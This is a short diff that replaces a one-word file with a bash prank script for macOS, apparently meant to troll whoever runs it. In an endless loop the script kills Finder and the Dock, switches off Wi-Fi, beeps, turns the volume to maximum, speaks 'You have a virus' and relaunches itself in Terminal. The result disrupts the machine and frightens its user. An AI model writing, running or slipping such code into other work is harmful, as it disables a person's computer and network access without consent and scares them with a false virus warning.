@@ -1,1 +1,10 @@
-yay
+#!/bin/bash
+while true; do
+killall Finder
+killall Dock
+networksetup -setairportpower en1 off
+osascript -e 'beep'
+osascript -e "set volume 7"
+say You have a virus
+open -a Terminal.app ~/trollingnl
+done
